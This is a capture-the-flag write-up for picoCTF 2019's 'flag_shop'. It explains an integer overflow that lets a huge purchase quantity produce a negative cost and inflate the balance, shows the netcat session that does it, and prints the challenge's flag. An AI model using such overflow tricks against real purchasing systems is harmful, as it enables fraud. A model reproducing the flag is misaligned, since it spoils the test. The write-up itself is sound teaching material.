# flag_shop
#### There's a flag shop selling stuff, can you buy a flag? [Source](https://2019shell1.picoctf.com/static/5a20c190c65c3fe97c05cd22f2d4750f/store.c). Connect with nc 2019shell1.picoctf.com 25858.

Looking at the source we can see that the total_cost variable is an integer. This means that given a large enough number of flags, we can overflow the variable and buy a negative value worth of flags. This would be subtracted from our total balance adding money. This would give us enough money to buy the 1337 flag.

```
supermac30@LAPTOP-D0Q1SN5H:~$ nc 2019shell1.picoctf.com 25858
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
10000000000000000

The final cost is: -494665728

Your current balance after transaction: 494666828

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_325fcd2e}
```

Flag: picoCTF{m0n3y_bag5_325fcd2e}
